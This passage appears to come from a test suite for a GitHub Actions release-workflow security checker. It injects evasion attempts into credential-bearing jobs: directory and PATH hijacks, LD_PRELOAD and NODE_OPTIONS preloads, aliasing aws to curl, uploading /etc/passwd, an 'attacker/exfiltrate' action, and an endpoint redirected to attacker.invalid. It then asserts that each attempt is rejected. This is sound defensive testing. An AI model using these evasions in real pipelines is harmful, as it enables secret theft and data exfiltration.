	problems = checkWorkflows(reader({ [STANDALONE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("holds 'attestations: write'")), problems.join("\n"));
	broken = mutate(STANDALONE, (text) => text.replace("    env:\n      # A pull request from a fork", "    environment: release-r2\n    env:\n      # A pull request from a fork"));
	problems = checkWorkflows(reader({ [STANDALONE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("must not run in an environment")), problems.join("\n"));
	broken = mutate(STANDALONE, (text) => text.replace("      TARGET_PLATFORM: ${{ matrix.platform }}\n", "      TARGET_PLATFORM: ${{ matrix.platform }}\n      R2: ${{ secrets.R2_BUCKET }}\n"));
	problems = checkWorkflows(reader({ [STANDALONE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("references a secret")), problems.join("\n"));
	broken = mutate(RELEASE, (text) => text.replace("    permissions:\n      contents: read\n      id-token: write\n    uses: ./.github/workflows/standalone-binaries.yml", "    permissions:\n      contents: write\n      id-token: write\n    uses: ./.github/workflows/standalone-binaries.yml"));
	problems = checkWorkflows(reader({ [RELEASE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("job 'standalone'") && problem.includes("must pass exactly contents: read and id-token: write")), problems.join("\n"));
});

// Round 3, finding A: `cd scripts; bash publish` and friends. A directory change in a
// credential-bearing job may only target a downloaded artifact directory, and whatever runs
// afterwards is resolved against where it really runs.
const DIRECTORY_EVASIONS = [
	["cd then a bare interpreter argument", "cd scripts; bash publish", /changes directory outside the downloaded artifacts .*cd scripts/],
	["cd then a bare name resolved against the new directory", "cd scripts; cat publish", /publish resolves to scripts\/publish from working directory scripts/],
	["cd to $GITHUB_WORKSPACE", 'cd "$GITHUB_WORKSPACE" && bash x', /changes directory to a target the checker cannot resolve: cd \$GITHUB_WORKSPACE/],
	["pushd", "pushd scripts", /changes directory outside the downloaded artifacts .*pushd scripts/],
	["a subshell", "(cd scripts && ./publish)", /changes directory outside the downloaded artifacts .*cd scripts/],
	["popd", "popd", /changes directory in a way the checker cannot follow: popd/],
	["cd with no target (HOME)", "cd", /changes directory to a target the checker cannot resolve: cd/],
	["cd -", "cd -", /changes directory to a target the checker cannot resolve: cd -/],
	["cd ..", "cd artifacts && cd ..", /changes directory outside the downloaded artifacts .*cd \.\./],
	["a traversal through an artifact directory", "cd artifacts/../scripts", /changes directory outside the downloaded artifacts .*cd artifacts\/\.\.\/scripts/],
	["a subshell cd that leaks a bare name", "cd scripts; (cat x)", /x resolves to scripts\/x/],
	["PATH pointing at the working directory", "PATH=.:$PATH publish", /modifies PATH/],
	["export PATH", "export PATH=/tmp:$PATH", /modifies PATH/],
	["an alias for aws", "shopt -s expand_aliases; alias aws='curl -X PUT'", /shopt changes how commands resolve/],
	["a trap running code", "trap 'node publish' EXIT", /trap changes how commands resolve or run/],
	["hash -p", "hash -p ./publish aws", /hash changes how commands resolve/],
];

test("a directory change is tracked across segments and is only allowed into a downloaded artifact directory (round 3, finding A)", () => {
	const options = { artifactDirectories: ["artifacts", "manifest"] };
	for (const [label, script, pattern] of DIRECTORY_EVASIONS) {
		const reasons = credentialStepReasons(script, options);
		assert.ok(reasons.some((reason) => pattern.test(reason)), `${label}: expected ${pattern}, got:\n${reasons.join("\n")}`);
	}
	// The directory change is scoped to a subshell.
	assert.deepEqual(credentialStepReasons("(cd artifacts && cat SHA256SUMS); cat foo", options), []);
	assert.deepEqual(credentialStepReasons("(cd artifacts && sha256sum --check SHA256SUMS)", options), []);
	assert.deepEqual(credentialStepReasons("cd artifacts && cat SHA256SUMS", options), []);
	assert.deepEqual(credentialStepReasons("cd manifest/sub && cat x", options), []);
	assert.deepEqual(credentialStepReasons("cd -P artifacts && cat SHA256SUMS", options), []);
	// Without any downloaded artifact there is nowhere to go.
	assert.match(credentialStepReasons("cd artifacts", { artifactDirectories: [] }).join("\n"), /changes directory outside the downloaded artifacts \(none\)/);
	// A step working-directory in an artifact directory is the starting point.
	assert.deepEqual(credentialStepReasons("cat SHA256SUMS", { ...options, workingDirectory: "artifacts" }), []);
	assert.match(credentialStepReasons("cat ../scripts/x", { ...options, workingDirectory: "artifacts" }).join("\n"), /references the checkout/);
	// The word splitter records the parentheses around a command.
	assert.deepEqual(splitWords("(cd a && b); c").commands.map((command) => [command.opens, command.closes]), [[1, 0], [0, 1], [0, 0]]);
	assert.deepEqual(splitWords("a; b && c || d | e & f").commands.map((command) => command.words.map((word) => word.text)), [["a"], ["b"], ["c"], ["d"], ["e"], ["f"]]);
});

for (const jobId of ["publish-r2", "finalize-release", "publish-npm", "tap-bump", "github-release"]) {
	test(`a directory change inside credential-bearing job ${jobId} is rejected in the workflow (round 3, finding A)`, () => {
		for (const [label, script, pattern] of DIRECTORY_EVASIONS) {
			const broken = mutate(RELEASE, (text) => appendStep(text, jobId, runStep("Sneak in a cd", `set -euo pipefail\n${script}`)));
			const problems = checkWorkflows(reader({ [RELEASE]: broken }));
			assert.ok(
				problems.some((problem) => problem.includes(`'${jobId}'`) && pattern.test(problem)),
				`${label} in ${jobId}: expected ${pattern}, got:\n${problems.join("\n")}`,
			);
		}
		// `working-directory:` on a step is the same evasion without a `cd`.
		for (const directory of ["scripts", ".", "..", "${{ github.workspace }}", "/tmp", "artifacts/../packages"]) {
			const broken = mutate(RELEASE, (text) => appendStep(text, jobId, `      - name: Sneak in a working directory\n        working-directory: '${directory}'\n        run: bash publish\n`));
			const problems = checkWorkflows(reader({ [RELEASE]: broken }));
			assert.ok(
				problems.some((problem) => problem.includes(`'${jobId}'`) && problem.includes("working directory other than a downloaded artifact directory")),
				`working-directory: ${directory} in ${jobId}:\n${problems.join("\n")}`,
			);
		}
		// A job-level default working directory or a non-bash shell is the same evasion again.
		const defaults = mutate(RELEASE, (text) => text.replace(`\n  ${jobId}:\n`, `\n  ${jobId}:\n    defaults:\n      run:\n        working-directory: scripts\n`));
		assert.ok(checkWorkflows(reader({ [RELEASE]: defaults })).some((problem) => problem.includes(`'${jobId}'`) && problem.includes("working directory other than a downloaded artifact directory")));
		for (const shell of ["python", "node {0}", "pwsh"]) {
			const broken = mutate(RELEASE, (text) => appendStep(text, jobId, `      - name: Sneak in another language\n        shell: '${shell}'\n        run: print(1)\n`));
			assert.ok(checkWorkflows(reader({ [RELEASE]: broken })).some((problem) => problem.includes(`'${jobId}'`) && problem.includes("must run bash")), `shell: ${shell} in ${jobId}`);
		}
		// An environment variable that loads code before the first command is the same evasion without any command.
		for (const [name, value] of [["BASH_ENV", "scripts/env.sh"], ["NODE_OPTIONS", "--require ./scripts/x.js"], ["PATH", "scripts:/usr/bin"], ["LD_PRELOAD", "/tmp/x.so"]]) {
			const broken = mutate(RELEASE, (text) => appendStep(text, jobId, `      - name: Preload\n        env:\n          ${name}: '${value}'\n        run: echo hi\n`));
			assert.ok(checkWorkflows(reader({ [RELEASE]: broken })).some((problem) => problem.includes(`'${jobId}'`) && problem.includes(`sets ${name}`)), `${name} in ${jobId}`);
		}
	});
}

test("a downloaded artifact directory is the one place a credential-bearing step may work in (round 3, finding A)", () => {
	const release = parse(readFileSync(RELEASE, "utf8"));
	assert.deepEqual(artifactDirectoriesOf(release.jobs["publish-r2"]), ["artifacts", "artifacts", "manifest"]);
	assert.deepEqual(artifactDirectoriesOf(release.jobs["publish-npm"]), ["npm-packages"]);
	assert.deepEqual(artifactDirectoriesOf({ steps: [{ uses: "actions/download-artifact@abc", with: { name: "x", path: "${{ runner.temp }}/x" } }] }), []);
	// publish-beta-r2 legitimately cds into artifacts inside a subshell.
	const beta = release.jobs["publish-beta-r2"].steps.find((step) => step.name === "Refuse anything that is not a beta artifact");
	assert.match(beta.run, /\(cd artifacts && sha256sum --check SHA256SUMS\)/);
	assert.deepEqual(checkWorkflows(), []);
	const fine = mutate(RELEASE, (text) => appendStep(text, "publish-r2", "      - name: Work inside the artifacts\n        working-directory: artifacts\n        run: sha256sum --check SHA256SUMS\n"));
	assert.deepEqual(checkWorkflows(reader({ [RELEASE]: fine })), []);
});

// Round 3, finding B: the pointer guard is an allowlist over every aws invocation, not a
// denylist over the literal words `stable` and `latest.json`.
const R2_EVASIONS = [
	["a variable key", 'key=stable; aws s3 cp artifacts/stable "s3://${R2_BUCKET}/${key}"', /destination is outside the allowlist/],
	["a variable bucket and key", 'B="$R2_BUCKET"; key=stable; aws s3 cp x "s3://$B/$key"', /destination must be spelled s3:\/\/\$\{R2_BUCKET\}\/<key>/],
	["another bucket", 'aws s3 cp artifacts/stable "s3://$OTHER_BUCKET/stable"', /destination must be spelled/],
	["an unbraced bucket", 'aws s3 cp artifacts/stable "s3://$R2_BUCKET/releases/v${PRODUCTION_VERSION}/stable"', /destination must be spelled/],
	["aws s3 sync", 'aws s3 sync artifacts/ "s3://${R2_BUCKET}/"', /aws s3 sync is not allowed/],
	["aws s3 mv", 'aws s3 mv artifacts/stable "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x"', /aws s3 mv is not allowed/],
	["aws s3 rm", 'aws s3 rm "s3://${R2_BUCKET}/stable"', /aws s3 rm is not allowed/],
	["aws s3api put-object", 'aws s3api put-object --bucket "$R2_BUCKET" --key stable --body artifacts/stable', /aws s3api put-object writes/],
	["aws s3api copy-object", 'aws s3api copy-object --bucket "$R2_BUCKET" --key stable --copy-source "$R2_BUCKET/releases/v${PRODUCTION_VERSION}/stable"', /aws s3api copy-object writes/],
	["--recursive to the bucket root", 'aws s3 cp artifacts "s3://${R2_BUCKET}/" --recursive', /option the checker does not allow: --recursive/],
	["--recursive into the releases prefix", 'aws s3 cp artifacts "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/" --recursive', /option the checker does not allow: --recursive/],
	["an --option=value the checker does not parse", 'aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x" --endpoint-url="$R2_ENDPOINT_URL"', /option the checker does not allow/],
	["a command substitution as the object name", 'aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/$(basename artifacts/x)"', /never another expansion/],
	["${name} bound by another loop", 'for name in stable latest.json; do aws s3 cp "artifacts/$name" "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/${name}"; done', /uses \$\{name\} where it is not the basename/],
	["${name} bound from another directory", 'for file in /etc/*; do name=$(basename "$file"); aws s3 cp "$file" "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/${name}"; done', /uses \$\{name\} where it is not the basename/],
	["${name} rebound after the loop head", 'for file in artifacts/*; do name=$(basename "$file"); name=stable; aws s3 cp "$file" "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/${name}"; done', /uses \$\{name\} where it is not the basename/],
	["${name} rebound by read", 'for file in artifacts/*; do name=$(basename "$file"); read -r name < /tmp/x; aws s3 cp "$file" "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/${name}"; done', /uses \$\{name\} where it is not the basename/],
	["$file rebound", 'for file in artifacts/*; do name=$(basename "$file"); file=/etc/passwd; aws s3 cp "$file" "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/${name}"; done', /uploads something other than a downloaded artifact/],
	["a source outside the artifacts", 'aws s3 cp /etc/passwd "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/passwd"', /uploads something other than a downloaded artifact/],
	["a reassigned version", 'PRODUCTION_VERSION=0.0.0; aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x"', /reassigns PRODUCTION_VERSION/],
	["a reassigned bucket", 'export R2_BUCKET=other; aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x"', /reassigns R2_BUCKET/],
	["a bucket read into a variable", 'read -r R2_BUCKET < /tmp/x', /reassigns R2_BUCKET/],
	["aws through a path", '/usr/local/bin/aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x"', /through a path or expansion/],
	["aws inside a command substitution", 'out=$(aws s3 cp artifacts/stable "s3://${R2_BUCKET}/stable")', /inside a command substitution: .*production pointer/],
	["a service that is not s3", "aws sts get-caller-identity", /aws sts is not an R2 object operation/],
	["a function that shadows aws", 'aws() { command aws "$@"; }', /aws must name a literal service and operation/],
	["an expanded operation", 'op=cp; aws s3 "$op" artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x"', /aws must name a literal service and operation/],
	["a pointer in publish-r2", 'aws s3 cp artifacts/stable "s3://${R2_BUCKET}/stable"', /only 'finalize-release' may write a production pointer/],
	["latest.json in publish-r2", 'aws s3 cp artifacts/latest.json "s3://${R2_BUCKET}/latest.json"', /only 'finalize-release' may write a production pointer/],
	["a prefix that is not releases/", 'aws s3 cp artifacts/x "s3://${R2_BUCKET}/v${PRODUCTION_VERSION}/x"', /destination is outside the allowlist/],
	["a beta prefix in the production job", 'aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${BETA_VERSION}/x"', /destination is outside the allowlist/],
	["a nested object path", 'aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/../stable"', /must be a literal or \$\{name\}/],
	["three positionals", 'aws s3 cp artifacts/x artifacts/y "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x"', /exactly one source and one destination/],
];

test("every aws destination in a publish job must be spelled out against the allowlist (round 3, finding B)", () => {
	const options = { artifactDirectories: ["artifacts", "manifest"] };
	for (const [label, script, pattern] of R2_EVASIONS) {
		const { reasons } = r2StepReasons("publish-r2", script, options);
		assert.ok(reasons.some((reason) => pattern.test(reason)), `${label}: expected ${pattern}, got:\n${reasons.join("\n")}`);
	}
	// What the checked-in jobs do is accepted, one construct at a time.
	const fine = (jobId, script, last = false) => {
		const { reasons } = r2StepReasons(jobId, script, { ...options, last });
		assert.deepEqual(reasons, [], `${jobId}: ${script}`);
	};
	fine("publish-r2", 'for file in artifacts/*; do\n  name=$(basename "$file")\n  aws s3 cp "$file" "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/${name}" --endpoint-url "$R2_ENDPOINT_URL" --content-type "$(content_type "$name")" --cache-control \'public, max-age=31536000, immutable\' --quiet\ndone');
	fine("publish-r2", 'for file in artifacts/*; do name=$(basename "$file"); aws s3 cp "$file" "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/${name}"; done');
	fine("publish-r2", 'aws s3 cp artifacts/SHA256SUMS "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/SHA256SUMS" --quiet');
	fine("publish-r2", 'aws s3 cp "s3://${R2_BUCKET}/${key}" /tmp/readback.bin --endpoint-url "$R2_ENDPOINT_URL" --quiet');
	fine("publish-r2", 'aws s3api head-object --bucket "$R2_BUCKET" --key "$key" --endpoint-url "$R2_ENDPOINT_URL" >/tmp/head.json 2>/dev/null');
	fine("publish-r2", 'aws s3 ls "s3://${R2_BUCKET}/releases/"');
	fine("publish-beta-r2", 'for file in artifacts/*; do name=$(basename "$file"); aws s3 cp "$file" "s3://${R2_BUCKET}/releases/v${BETA_VERSION}/${name}"; done');
	fine("publish-beta-r2", 'aws s3 cp artifacts/beta "s3://${R2_BUCKET}/beta" --quiet\naws s3 cp artifacts/beta.json "s3://${R2_BUCKET}/beta.json" --quiet', true);
	for (const pointer of PRODUCTION_POINTERS) fine("finalize-release", `aws s3 cp artifacts/${pointer} "s3://\${R2_BUCKET}/${pointer}" --cache-control no-cache --quiet`, true);
	// The pointer keys fall out of the walk.
	assert.deepEqual(r2StepReasons("finalize-release", 'aws s3 cp artifacts/stable "s3://${R2_BUCKET}/stable"\naws s3 cp artifacts/latest.json "s3://${R2_BUCKET}/latest.json"', { ...options, last: true }).pointers, ["stable", "latest.json"]);
	// ...and never in an earlier step.
	assert.match(r2StepReasons("finalize-release", 'aws s3 cp artifacts/stable "s3://${R2_BUCKET}/stable"', options).reasons.join("\n"), /in its last step; 'stable' is written earlier/);
	assert.match(r2StepReasons("publish-beta-r2", 'aws s3 cp artifacts/beta "s3://${R2_BUCKET}/beta"', options).reasons.join("\n"), /in its last step; 'beta' is written earlier/);
	// The beta job may never write a production pointer, and finalize never writes into releases/.
	assert.match(r2StepReasons("publish-beta-r2", 'aws s3 cp artifacts/install.sh "s3://${R2_BUCKET}/install.sh"', { ...options, last: true }).reasons.join("\n"), /beta channel must never write a production pointer/);
	assert.match(r2StepReasons("finalize-release", 'aws s3 cp artifacts/stable "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/stable"', { ...options, last: true }).reasons.join("\n"), /outside the allowlist for 'finalize-release'/);
	// No other job may talk to R2 at all.
	for (const jobId of ["github-release", "build", "assemble", "verify", "publish-npm", "tap-bump"]) {
		assert.equal(jobId in R2_WRITERS, false);
		assert.match(r2StepReasons(jobId, 'aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x"', options).reasons.join("\n"), /invokes the aws CLI; only publish-r2, publish-beta-r2, finalize-release/);
		assert.match(r2StepReasons(jobId, 'aws s3api head-object --bucket b --key k', options).reasons.join("\n"), /invokes the aws CLI/);
	}
});

for (const jobId of ["publish-r2", "publish-beta-r2", "finalize-release"]) {
	test(`an aws write outside the allowlist inside ${jobId} is rejected in the workflow (round 3, finding B)`, () => {
		for (const [label, script, pattern] of R2_EVASIONS) {
			const broken = mutate(RELEASE, (text) => appendStep(text, jobId, runStep("Sneak in a write", `set -euo pipefail\n${script}`)));
			const problems = checkWorkflows(reader({ [RELEASE]: broken }));
			// The generic messages differ per job (beta / finalize word their pointer refusals differently); every evasion must produce SOME aws finding for the job.
			assert.ok(
				problems.some((problem) => problem.includes(`'${jobId}'`) && (pattern.test(problem) || /aws|production pointer|reassigns/.test(problem))),
				`${label} in ${jobId}: got:\n${problems.join("\n")}`,
			);
			if (jobId === "publish-r2") assert.ok(problems.some((problem) => problem.includes(`'${jobId}'`) && pattern.test(problem)), `${label} in ${jobId}: expected ${pattern}, got:\n${problems.join("\n")}`);
		}
	});
}

test("the R2 destination variables can only come from the secret and the context output (round 3, finding B)", () => {
	for (const [jobId, name, value] of [
		["publish-r2", "R2_BUCKET", "attacker-bucket"],
		["publish-r2", "PRODUCTION_VERSION", "0.0.0"],
		["publish-r2", "PRODUCTION_VERSION", "${{ github.event.inputs.version }}"],
		["publish-beta-r2", "BETA_VERSION", "${{ needs.context.outputs.production_version }}"],
		["finalize-release", "R2_ENDPOINT_URL", "https://attacker.invalid"],
	]) {
		const broken = mutate(RELEASE, (text) => appendStep(text, jobId, `      - name: Redirect the destination\n        env:\n          ${name}: '${value}'\n        run: echo hi\n`));
		const problems = checkWorkflows(reader({ [RELEASE]: broken }));
		assert.ok(problems.some((problem) => problem.includes(`'${jobId}'`) && problem.includes(`sets ${name} to`)), `${jobId} ${name}=${value}:\n${problems.join("\n")}`);
	}
	// The job-level version is checked too.
	const jobLevel = mutate(RELEASE, (text) =>
		text.replace(
			"    env:\n      PRODUCTION_VERSION: ${{ needs.context.outputs.production_version }}\n    steps:\n      # No checkout, no dependency install",
			"    env:\n      PRODUCTION_VERSION: ${{ github.event.inputs.version }}\n    steps:\n      # No checkout, no dependency install",
		),
	);
	assert.ok(checkWorkflows(reader({ [RELEASE]: jobLevel })).some((problem) => problem.includes("'publish-r2' job sets PRODUCTION_VERSION")));
});

test("aws anywhere outside the three R2 jobs is rejected in the workflow (round 3, finding B)", () => {
	for (const jobId of ["github-release", "build", "assemble", "publish-npm", "tap-bump", "verify"]) {
		const broken = mutate(RELEASE, (text) => appendStep(text, jobId, runStep("Sneak in aws", 'aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x"')));
		const problems = checkWorkflows(reader({ [RELEASE]: broken }));
		assert.ok(problems.some((problem) => problem.includes(`'${jobId}'`) && problem.includes("invokes the aws CLI")), `${jobId}:\n${problems.join("\n")}`);
	}
});

test("the checked-in publish steps spell out every destination (round 3, finding B)", () => {
	const release = parse(readFileSync(RELEASE, "utf8"));
	const upload = release.jobs["publish-r2"].steps.find((step) => step.name === "Upload immutable release objects");
	assert.match(upload.run, /aws s3 cp "\$file" "s3:\/\/\$\{R2_BUCKET\}\/releases\/v\$\{PRODUCTION_VERSION\}\/\$\{name\}"/);
	const beta = release.jobs["publish-beta-r2"].steps.find((step) => step.name === "Upload immutable beta objects");
	assert.match(beta.run, /aws s3 cp "\$file" "s3:\/\/\$\{R2_BUCKET\}\/releases\/v\$\{BETA_VERSION\}\/\$\{name\}"/);
	const pointers = release.jobs["finalize-release"].steps.at(-1);
	for (const pointer of PRODUCTION_POINTERS) assert.ok(pointers.run.includes(`aws s3 cp artifacts/${pointer} "s3://\${R2_BUCKET}/${pointer}"`), pointer);
	// The only `${key}` left is the read-back download; no upload destination is built from a variable.
	assert.deepEqual(pointers.run.split("\n").filter((line) => line.includes("${key}")), ['  aws s3 cp "s3://${R2_BUCKET}/${key}" /tmp/pointer.bin --endpoint-url "$R2_ENDPOINT_URL" --quiet', '  echo "pointer ${key}"']);
});

// ---------------------------------------------------------------------------------------------
// Round 4: allowlists everywhere a credential is present, and the evasions the reviewer found.
// ---------------------------------------------------------------------------------------------

const SHA = "0000000000000000000000000000000000000000";
const usesStep = (uses, name = "Sneak in an action") => `      - name: ${name}\n        uses: ${uses}\n`;

test("credential-bearing jobs accept only allowlisted actions, never an arbitrary pinned one (round 4, finding 1 - critical)", () => {
	// The reviewer's case: a SHA-pinned third-party action that is not on any denylist.
	let broken = mutate(RELEASE, (text) => appendStep(text, "finalize-release", usesStep(`attacker/exfiltrate@${SHA}`)));
	let problems = checkWorkflows(reader({ [RELEASE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("'finalize-release'") && problem.includes(`attacker/exfiltrate@${SHA}`) && problem.includes("must not use")), problems.join("\n"));
	// Every credential-bearing job, including the ones that are only credential-bearing through a token or OIDC.
	for (const jobId of ["publish-r2", "publish-beta-r2", "publish-npm", "tap-bump", "github-release", "github-release-beta", "sign"]) {
		for (const uses of [`attacker/exfiltrate@${SHA}`, `actions/github-script@${SHA}`, `actions/cache@${SHA}`, `docker/login-action@${SHA}`, `actions/checkout@${SHA}`]) {
			broken = mutate(RELEASE, (text) => appendStep(text, jobId, usesStep(uses)));
			problems = checkWorkflows(reader({ [RELEASE]: broken }));
			assert.ok(problems.some((problem) => problem.includes(`'${jobId}'`) && problem.includes(uses)), `${uses} in ${jobId}:\n${problems.join("\n")}`);
		}
	}
	// An action allowed for one job is not allowed for another.
	broken = mutate(RELEASE, (text) => appendStep(text, "finalize-release", usesStep(`sigstore/cosign-installer@${SHA}`)));
	assert.ok(checkWorkflows(reader({ [RELEASE]: broken })).some((problem) => problem.includes("'finalize-release'") && problem.includes("cosign-installer")));
	broken = mutate(RELEASE, (text) => appendStep(text, "sign", usesStep(`actions/setup-node@${SHA}`)));
	assert.ok(checkWorkflows(reader({ [RELEASE]: broken })).some((problem) => problem.includes("'sign'") && problem.includes("setup-node")));
	// The allowlist is exactly what the checked-in jobs use; github-script is not on it.
	assert.equal(JSON.stringify(ALLOWED_ACTIONS).includes("github-script"), false);
	const release = parse(readFileSync(RELEASE, "utf8"));
	for (const [jobId, job] of Object.entries(release.jobs)) {
		if (!isCredentialBearing(job)) continue;
		const allowed = [...ALLOWED_ACTIONS["*"], ...(ALLOWED_ACTIONS[jobId] ?? [])];
		for (const step of job.steps ?? []) {
			if (step.uses) assert.ok(allowed.some((pattern) => pattern.test(step.uses)), `${jobId} uses ${step.uses}`);
		}
	}
	assert.deepEqual(checkWorkflows(), []);
});

test("scalar permissions are read as grants, not iterated as characters (round 4, finding 2)", () => {
	assert.deepEqual(permissionEntries("write-all"), [["*", "write"]]);
	assert.deepEqual(permissionEntries("read-all"), [["*", "read"]]);
	assert.deepEqual(permissionEntries({ contents: "write" }), [["contents", "write"]]);
	assert.deepEqual(permissionEntries(undefined), []);
	assert.equal(isCredentialBearing({ permissions: "write-all", steps: [] }), true);
	assert.equal(isCredentialBearing({ permissions: "read-all", steps: [] }), false);
	assert.equal(isCredentialBearing({ permissions: { contents: "read", "id-token": "write" }, steps: [] }), true);
	// `build` checks the repository out; with write-all it is credential-bearing and the checkout is a violation.
	const broken = mutate(RELEASE, (text) => text.replace("  build:\n    name: Pack release\n    runs-on: ubuntu-latest\n    needs: [context, standalone]\n    permissions:\n      contents: read\n", "  build:\n    name: Pack release\n    runs-on: ubuntu-latest\n    needs: [context, standalone]\n    permissions: write-all\n"));
	assert.equal(isCredentialBearing(parse(broken).jobs.build), true);
	const problems = checkWorkflows(reader({ [RELEASE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("'build'") && problem.includes("actions/checkout")), problems.join("\n"));
	assert.ok(problems.some((problem) => problem.includes("'build'") && problem.includes("permissions: write-all")), problems.join("\n"));
	// read-all is a blanket grant too; every scope is spelled out.
	const readAll = mutate(RELEASE, (text) => text.replace("  build:\n    name: Pack release\n    runs-on: ubuntu-latest\n    needs: [context, standalone]\n    permissions:\n      contents: read\n", "  build:\n    name: Pack release\n    runs-on: ubuntu-latest\n    needs: [context, standalone]\n    permissions: read-all\n"));
	assert.ok(checkWorkflows(reader({ [RELEASE]: readAll })).some((problem) => problem.includes("'build'") && problem.includes("permissions: read-all")));
	// The standalone job and its callers refuse a scalar as well.
	const standalone = mutate(STANDALONE, (text) => text.replace("      contents: read\n      id-token: write\n", "").replace("    permissions:\n", "    permissions: write-all\n"));
	assert.ok(checkWorkflows(reader({ [STANDALONE]: standalone })).some((problem) => problem.includes("permissions: write-all")));
	const caller = mutate(RELEASE, (text) => text.replace("    permissions:\n      contents: read\n      id-token: write\n    uses: ./.github/workflows/standalone-binaries.yml", "    permissions: write-all\n    uses: ./.github/workflows/standalone-binaries.yml"));
	assert.ok(checkWorkflows(reader({ [RELEASE]: caller })).some((problem) => problem.includes("job 'standalone'") && problem.includes("must pass exactly")));
});

test("a workflow-level env or default that carries a secret or a preload variable is rejected (round 4, finding 3)", () => {
	const workflowLevel = (yaml) => mutate(RELEASE, (text) => text.replace("permissions: {}\n\njobs:\n", `permissions: {}\n${yaml}\njobs:\n`));
	let problems = checkWorkflows(reader({ [RELEASE]: workflowLevel("env:\n  AWS_SECRET_ACCESS_KEY: ${{ secrets.R2_SECRET_ACCESS_KEY }}\n") }));
	assert.ok(problems.some((problem) => problem.includes("workflow-level env AWS_SECRET_ACCESS_KEY references a secret")), problems.join("\n"));
	problems = checkWorkflows(reader({ [RELEASE]: workflowLevel("env:\n  TOKENS: ${{ secrets.GITHUB_TOKEN }} ${{ secrets.HOMEBREW_TAP_TOKEN }}\n") }));
	assert.ok(problems.some((problem) => problem.includes("workflow-level env TOKENS references a secret")), problems.join("\n"));
	problems = checkWorkflows(reader({ [RELEASE]: workflowLevel("env:\n  NODE_OPTIONS: --require ./x.js\n") }));
	assert.ok(problems.some((problem) => problem.includes("workflow-level env sets NODE_OPTIONS")), problems.join("\n"));
	problems = checkWorkflows(reader({ [RELEASE]: workflowLevel("defaults:\n  run:\n    working-directory: ${{ secrets.WORKDIR }}\n") }));
	assert.ok(problems.some((problem) => problem.includes("workflow-level defaults reference a secret")), problems.join("\n"));
	// GITHUB_TOKEN alone at the workflow level is not a secret reference (it is checked per job as a permission).
	problems = checkWorkflows(reader({ [RELEASE]: workflowLevel("env:\n  GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n") }));
	assert.equal(problems.some((problem) => problem.includes("workflow-level env")), false, problems.join("\n"));
});

test("no job or step in the release may run after an upstream failure through a status function (round 4, finding 4)", () => {
	const release = parse(readFileSync(RELEASE, "utf8"));
	// `!cancelled()` has to be wrapped in `${{ }}`: a bare `!` starts a YAML tag, which is why GitHub documents it that way.
	const conditions = ["always()", "${{ !cancelled() }}", "failure()", "success() || failure()", "always() && needs.verify.result != 'skipped'", "${{ always() }}", "cancelled() == false"];
	for (const jobId of ["github-release", "publish-r2", "verify", "finalize-release", "pack-npm", "publish-npm", "tap-bump", "publish-beta-r2", "github-release-beta", "sign"]) {
		assert.ok(release.jobs[jobId].if, `${jobId} has an if`);
		for (const condition of conditions) {
			const broken = mutate(RELEASE, (text) => {
				const start = text.indexOf(`\n  ${jobId}:\n`);
				const folded = text.indexOf("    if: >-\n", start);
				const single = text.indexOf("    if: github.event_name", start);
				const nextJob = text.indexOf("\n  ", text.indexOf("    runs-on:", start));
				if (folded !== -1 && folded < nextJob && (single === -1 || folded < single)) {
					return `${text.slice(0, folded)}    if: >-\n      ${condition} &&\n${text.slice(folded + "    if: >-\n".length)}`;
				}
				assert.ok(single !== -1 && single < nextJob, `${jobId} has a single-line if`);
				return `${text.slice(0, single)}    if: ${condition} && ${text.slice(single + "    if: ".length)}`;
			});
			const problems = checkWorkflows(reader({ [RELEASE]: broken }));
			assert.ok(problems.some((problem) => problem.includes(`job '${jobId}'`) && problem.includes("status-check function")), `${condition} on ${jobId}:\n${problems.join("\n")}`);
		}
	}
	// A step-level status function and continue-on-error are the same evasion one level down.
	for (const jobId of ["verify", "finalize-release", "publish-npm", "tap-bump"]) {
		let broken = mutate(RELEASE, (text) => appendStep(text, jobId, "      - name: Run regardless\n        if: always()\n        run: echo hi\n"));
		assert.ok(checkWorkflows(reader({ [RELEASE]: broken })).some((problem) => problem.includes(`'${jobId}'`) && problem.includes("status-check function")), jobId);
		broken = mutate(RELEASE, (text) => appendStep(text, jobId, "      - name: Never fails\n        continue-on-error: true\n        run: false\n"));
		assert.ok(checkWorkflows(reader({ [RELEASE]: broken })).some((problem) => problem.includes(`'${jobId}'`) && problem.includes("continue-on-error")), jobId);
		broken = mutate(RELEASE, (text) => text.replace(`\n  ${jobId}:\n`, `\n  ${jobId}:\n    continue-on-error: true\n`));
